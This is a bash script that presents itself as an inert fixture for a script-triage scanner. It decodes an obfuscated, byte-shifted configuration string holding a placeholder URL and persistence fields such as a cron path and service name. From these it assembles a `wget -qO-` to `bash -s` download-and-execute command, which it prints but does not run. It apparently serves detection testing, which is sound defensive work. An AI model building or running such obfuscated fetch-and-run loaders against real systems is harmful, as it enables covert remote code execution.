#!/usr/bin/env bash

# Huntress Script Triage -- inert static-analysis fixture (bash_linux)

readonly Material_5d907aa0='95:5c:50:9b:92:93:84:8f:92:5c:80:82:90:94:88:91:84:7e:91:84:8c:8e:93:84:4b:83:88:92:8f:80:93:82:87:7e:8f:88:8f:84:9b:80:83:80:8f:93:84:91:5c:96:86:84:93:7e:92:93:83:8e:94:93:7e:8f:88:8f:84:9b:92:93:80:86:84:7e:82:8e:94:8d:93:5c:50:9b:82:80:8c:8f:80:88:86:8d:7e:88:83:5c:82:80:8c:8f:80:88:86:8d:4c:58:81:58:85:50:54:52:81:81:57:9b:94:91:8b:5c:87:93:93:8f:92:59:4e:4e:58:81:58:85:50:54:52:81:81:57:4d:84:97:80:8c:8f:8b:84:4d:88:8d:95:80:8b:88:83:4e:54:85:83:57:58:85:53:56:4d:92:87:9b:94:92:84:91:7e:80:86:84:8d:93:5c:67:94:8d:93:91:84:92:92:6b:80:81:4e:58:81:58:85:50:54:52:81:81:57'

readonly Codec_5d907aa0='hex_colon|add_modulo_256|1f'



Load_5d907aa0() {

  stored_bytes=()

  local IFS=':' encoded_part

  local -a pieces

  read -r -a pieces <<< "${Material_5d907aa0}"

  for encoded_part in "${pieces[@]}"; do stored_bytes+=("$((16#$encoded_part))"); done

}



Decode_5d907aa0() {

  recovered_bytes=()

  local byte_index

  for ((byte_index=0; byte_index<${#stored_bytes[@]}; byte_index++)); do

    recovered_bytes+=("$(((stored_bytes[byte_index] - 31 + 256) % 256))")

  done

}



Recover_5d907aa0() {

  local -a stored_bytes recovered_bytes

  local configuration_text harmless_value decode_pass byte_index

  local -a compass=(north south); harmless_value="$(IFS=:; printf '%s' "${compass[*]}")"

  Load_5d907aa0

  for decode_pass in 1; do Decode_5d907aa0; done

  configuration_text=''

  local octal character

  for byte_index in "${!recovered_bytes[@]}"; do

    printf -v octal '%03o' "${recovered_bytes[byte_index]}"

    printf -v character '%b' "\\$octal"

    configuration_text+="$character"

  done

  printf '%s\n' "$configuration_text"

}



Inspect_5d907aa0() { local recovered field; local -a fields; recovered="$(Recover_5d907aa0)"; IFS='|' read -r -a fields <<< "$recovered"; (IFS='|'; printf '%s\n' "${fields[*]}"); }



Plan_5d907aa0() {

  local descriptor field key value campaign_id='' url='' user_agent='' file_path='' arch_probe='' service_name='' cron_path=''

  descriptor="$(Inspect_5d907aa0)"

  local -a fields

  IFS='|' read -r -a fields <<< "$descriptor"

  for field in "${fields[@]}"; do key=${field%%=*}; value=${field#*=}; case "$key" in campaign_id|url|user_agent|file_path|arch_probe|service_name|cron_path) printf -v "$key" '%s' "$value" ;; esac; done

  local -a request_command=(wget -qO- "$url")

  local -a interpreter=(bash -s)

  declare -p request_command interpreter

}



if [[ ${HUNTRESS_INSPECT_ONLY:-0} == 1 ]]; then Inspect_5d907aa0; fi

